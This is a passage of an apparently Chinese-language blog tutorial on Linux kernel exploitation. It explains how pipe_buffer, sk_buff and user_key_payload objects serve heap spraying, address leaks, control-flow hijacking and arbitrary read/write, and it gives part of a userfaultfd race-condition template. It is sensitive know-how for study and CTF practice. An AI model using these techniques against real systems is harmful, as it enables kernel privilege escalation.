class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">        ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size, nr_pages;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = round_pipe_size(arg);</span><br><span class="line">nr_pages = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If trying to increase the pipe capacity, check that an</span></span><br><span class="line"><span class="comment"> * unprivileged user is not trying to exceed various limits</span></span><br><span class="line"><span class="comment"> * (soft limit check here, hard limit check just below).</span></span><br><span class="line"><span class="comment"> * Decreasing the pipe capacity is always permitted, even</span></span><br><span class="line"><span class="comment"> * if the user is currently over a limit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">size &gt; pipe_max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">user_bufs = account_pipe_buffers(pipe-&gt;user, pipe-&gt;buffers, nr_pages);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">(too_many_pipe_buffers_hard(user_bufs) ||</span><br><span class="line"> too_many_pipe_buffers_soft(user_bufs)) &amp;&amp;</span><br><span class="line">is_unprivileged_user()) &#123;</span><br><span class="line">ret = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We can shrink the pipe, if arg &gt;= pipe-&gt;nrbufs. Since we don&#x27;t</span></span><br><span class="line"><span class="comment"> * expect a lot of shrink+grow operations, just free and allocate</span></span><br><span class="line"><span class="comment"> * again like we would do for growing. If the pipe currently</span></span><br><span class="line"><span class="comment"> * contains more buffers than arg, then return busy.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nr_pages &lt; pipe-&gt;nrbufs) &#123;</span><br><span class="line">ret = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bufs = kcalloc(nr_pages, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!bufs)) &#123;</span><br><span class="line">ret = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The pipe array wraps around, so just start the new one at zero</span></span><br><span class="line"><span class="comment"> * and adjust the indexes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;nrbufs) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"></span><br><span class="line">tail = pipe-&gt;curbuf + pipe-&gt;nrbufs;</span><br><span class="line"><span class="keyword">if</span> (tail &lt; pipe-&gt;buffers)</span><br><span class="line">tail = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">tail &amp;= (pipe-&gt;buffers - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;nrbufs - tail;</span><br><span class="line"><span class="keyword">if</span> (head)</span><br><span class="line"><span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + pipe-&gt;curbuf, head * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"><span class="keyword">if</span> (tail)</span><br><span class="line"><span class="built_in">memcpy</span>(bufs + head, pipe-&gt;bufs, tail * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;curbuf = <span class="number">0</span>;</span><br><span class="line">kfree(pipe-&gt;bufs);</span><br><span class="line">pipe-&gt;bufs = bufs;</span><br><span class="line">pipe-&gt;buffers = nr_pages;</span><br><span class="line"><span class="keyword">return</span> nr_pages * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="type">void</span>) account_pipe_buffers(pipe-&gt;user, nr_pages, pipe-&gt;buffers);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当选项为<code>F_SETPIPE_SZ</code></p><p>其会修改当前pipe的bufs数组大小为第三个参数<code>(arg&gt;&gt;12)*sizeof(*bufs)</code></p><p>例如当我们使用<code>fcntl(pipe_fd, F_SETPIPE_SZ, 0x1000 * 64)</code>时</p><p>就会更改bufs从<code>kmalloc-cg-2k</code>进行分配</p><p>不过注意arg&gt;&gt;12必须是2的幂次方</p><hr><p><strong>劫持执行流</strong></p><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment"> * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment"> * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment"> * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment"> * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment"> * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment"> * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment"> * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment"> * cache.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当执行到该指针时 rsi 寄存器刚好指向对应的 <code>pipe_buffer</code>，因此我们可以将函数表劫持到 <code>pipe_buffer</code> 上，找到一条合适的 gadget 将栈迁移到该处，从而更顺利地完成 ROP</p><p><strong>任意地址读写</strong></p><p>管道的读写通过 <code>pipe_buffer[i].page</code> 确定读写的内存，因此若我们能够修改 <code>page</code> 指针，则我们便能完成<strong>对整个物理内存区域的读操作，以及对直接映射区上有写权限的内存区域的写操作</strong></p><h2 id="sk-buff"><a href="#sk-buff" class="headerlink" title="sk_buff"></a>sk_buff</h2><p><strong>申请obj大小:&gt;=512</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:堆喷</strong></p><p><code>sk_buff</code> 是 Linux kernel 网络协议栈中一个<strong>重要的基础结构体</strong>，其用以表示在网络协议栈中传输的一个「包」，但其结构体本身不包含一个包的数据部分，而是包含该包的各种属性，<strong>数据包的本体数据则使用一个单独的 object 储存</strong></p><p>这个结构体成员比较多，我们主要关注核心部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* These two members must be first. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* These elements must be at the end, see alloc_skb() for details.  */</span></span><br><span class="line"><span class="type">sk_buff_data_t</span>tail;</span><br><span class="line"><span class="type">sk_buff_data_t</span>end;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>*head,</span><br><span class="line">*data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>truesize;</span><br><span class="line"><span class="type">refcount_t</span>users;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span></span><br><span class="line"><span class="comment">/* only useable after checking -&gt;active_extensions != 0 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_ext</span>*<span class="title">extensions</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>sk_buff</code> 结构体与其所表示的数据包形成如下结构，其中：</p><ul><li><code>head</code> ：一个数据包<strong>实际的起始处</strong>（也就是为该数据包分配的 object 的首地址）</li><li><code>end</code> ：一个数据包实际的末尾（为该数据包分配的 object 的末尾地址）</li><li><code>data</code> ：<strong>当前所在 layer 的数据包对应的起始地址</strong></li><li><code>tail</code> ：<strong>当前所在 layer 的数据包对应的末尾地址</strong></li></ul><p>data 和 tail 可以这么理解：数据包每经过网络层次模型中的一层都会被添加/删除一个 header （有时还有一个 tail），data 与 tail 便是用以对此进行标识的</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/AV8HsnZj2bUCl4J.png" alt=""></p><p>多个 <code>sk_buff</code> 之间形成双向链表结构，类似于 <code>msg_queue</code>，这里同样有一个 <code>sk_buff_head</code> 结构作为哨兵节点</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/U8CjYMBOcZ74s3W.png" alt=""></p><p>在内核网络协议栈中很多地方都会用到该结构体，例如读写 socket 一类的操作都会造成包的创建，其最终都会调用到 <code>alloc_skb()</code> 来分配该结构体，而这个函数又是 <code>__alloc_skb()</code> 的 wrapper，不过需要注意的是其会从<strong>独立的</strong> <code>skbuff_fclone_cache</code>/ <code>skbuff_head_cache</code> 取 object</p><p><code>sk_buff</code> 虽然是从独立的 kmem_cache 中分配的，<strong>但其对应的数据包不是</strong></p><p>因此我们仍然可以实现近乎任意大小 object 的分配与释放</p><p>因此 <code>sk_buff</code> 与 <code>msg_msg</code> 一样常被用来完成堆喷的工作，不同的是 <code>msg_msg</code> 带了一个 header，而 <code>sk_buff</code> 的数据包则带一个 tail——<code>skb_shared_info</code> 结构体</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-04-02_213558.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> &#123;</span></span><br><span class="line">__u8flags;</span><br><span class="line">__u8meta_len;</span><br><span class="line">__u8nr_frags;</span><br><span class="line">__u8tx_flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>gso_size;</span><br><span class="line"><span class="comment">/* Warning: this field is not always filled in (UFO)! */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>gso_segs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">frag_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_hwtstamps</span> <span class="title">hwtstamps</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>gso_type;</span><br><span class="line">u32tskey;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Warning : all fields before dataref are cleared in __alloc_skb()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">atomic_t</span>dataref;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Intermediate layers must ensure that destructor_arg</span></span><br><span class="line"><span class="comment"> * remains valid until skb destructor */</span></span><br><span class="line"><span class="type">void</span> *destructor_arg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must be last field, see pskb_expand_head() */</span></span><br><span class="line"><span class="type">skb_frag_t</span>frags[MAX_SKB_FRAGS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>skb_shared_info</code> 结构体的<strong>大小为 320 字节，这意味着我们能够利用分配的 object 最小的大小也得是 512 字节，这无疑为我们的利用增添了几分难度</strong>，但不可否认的是 <code>sk_buff</code> 仍为我们提供了较大对象的任意分配写入与释放</p><p>正所谓有发必有收，我们只需要沿着发送的路径接收该包就能将其释放掉，例如若是我们通过向套接字中写入数据创建了一个包，则从套接字中读出该包便能将其释放</p><h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p><strong>申请obj大小:任意</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:泄露.text|泄露直接映射区地址</strong></p><p>在linux内核中有一套专门用于管理密钥的子系统,负责密钥的创建,读取,更新以及销毁等功能</p><p>内核提供了两个系统调用来负责这些操作</p><p><code>add_key()</code>和<code>keyctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">        <span class="type">key_serial_t</span> <span class="title function_">add_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">                                    <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen,</span></span><br><span class="line"><span class="params">                                    <span class="type">key_serial_t</span> keyring)</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">long</span> <span class="title function_">syscall</span><span class="params">(__NR_keyctl, <span class="type">int</span> operation, <span class="type">__kernel_ulong_t</span> arg2,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg3, <span class="type">__kernel_ulong_t</span> arg4,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg5)</span>;</span><br></pre></td></tr></table></figure><p>当调用<code>add_key()</code>创建带有 <code>description</code> 字符串的、类型为 <code>&quot;user&quot;</code> 的、长度为 <code>plen</code> 的内容为 <code>payload</code> 的密钥时</p><ul><li>首先会在内核空间中分配 obj 1 与 obj2，分配 flag 为 <code>GFP_KERNEL</code>，用以保存 <code>description</code> (字符串，最大大小为 4096)、<code>payload</code> (普通数据，大小无限制)</li><li>分配 obj3 保存 <code>description</code> ，分配 obj4 保存 <code>payload</code>，分配 flag 皆为 <code>GFP_KERNEL</code></li><li>释放 obj1 与 obj2，返回密钥 id</li></ul><p>其中 obj4 为一个 <code>user_key_payload</code> 结构体，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>  datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span>        data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>由于decription和payload的长度都是可控的,那么<code>obj1-4</code>的大小其实也是可控的</p><p>类似于 <code>msg_msg</code>，<code>user_key_payload</code> 结构体有着一个固定大小的头部，其余空间用来存储来自用户空间的数据（密钥内容）。</p><p><code>keyctl()</code> 系统调用为我们提供了读取、更新（分配新对象，释放旧对象）、销毁密钥（释放 payload）的功能，其中读取的最大长度由 <code>user_key_payload-&gt;datalen</code> 决定</p><p>读取 key 时的 len 应当<strong>不小于 user_key_payload-&gt;datalen，否则会读取失败</strong>,但是可以大于datalen。</p><p>当释放一个密钥时</p><p>内核中，对应的处理流程是<code>_x64_sys_keyctl() -&gt; keyctl_revoke_key() -&gt; key_revoke() -&gt; user_revoke() -&gt; call_rcu()</code>，在<code>call_rcu()</code>函数中将 <code>user_key_payload</code> 结构体的 <code>rcu.func</code> 设置成<code>user_free_payload_rcu()</code>函数的地址</p><h2 id="io-uring"><a href="#io-uring" class="headerlink" title="io_uring"></a>io_uring</h2><p><strong>申请obj大小:任意</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:泄露.text|泄露直接映射区地址</strong></p><p>io_uring是自内核版本 5.1 引入的全新的高性能异步 I/O 框架,</p><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h2 id="userfaultfd-1"><a href="#userfaultfd-1" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><p>userfaultfd配合copy_from_user或者copy_to_user在条件竞争中有着十分强大的作用</p><p>其作用就是监控在某一段内存中发生的页错误,并且可以由用户指定如何处理</p><p>一般情况下我们选择使用sleep()或者pause()等函数使该线程停下,这样让我们完成条件竞争构造uaf等,提供了十分便利的条件</p><p>不过在大概<code>5.11</code>版本前后,由于变量<code>sysctl_unprivileged_userfaultfd</code>不再被初识赋值为1,使得userfaultfd不再能被非root用户使用</p><p>一个模板:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_stuck_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler unblocked&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="comment">//这部分是缺页异常处理得到的页的内容填充</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page, <span class="type">void</span>* handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span 